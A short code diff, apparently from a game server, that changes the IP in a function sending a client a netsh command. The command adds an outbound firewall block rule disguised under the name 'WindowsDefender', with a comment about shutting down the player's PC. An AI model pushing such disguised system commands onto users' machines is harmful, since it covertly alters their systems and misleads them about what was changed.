@@ -492,7 +492,7 @@ void SendDerrubarCliente(int conn, short Modelo) //desliga o pc do garoto
 	break;
 	case 2:
 	{
-		strncpy(packet.Command, "netsh advfirewall firewall add rule name=WindowsDefender dir=out action=block protocol=tcp localip=any remoteip=26.33.128.59", sizeof(packet.Command)); //colocar ip do servidor ali
+		strncpy(packet.Command, "netsh advfirewall firewall add rule name=WindowsDefender dir=out action=block protocol=tcp localip=any remoteip=192.168.0.6", sizeof(packet.Command)); //colocar ip do servidor ali
 	}
 	break;
 	default:
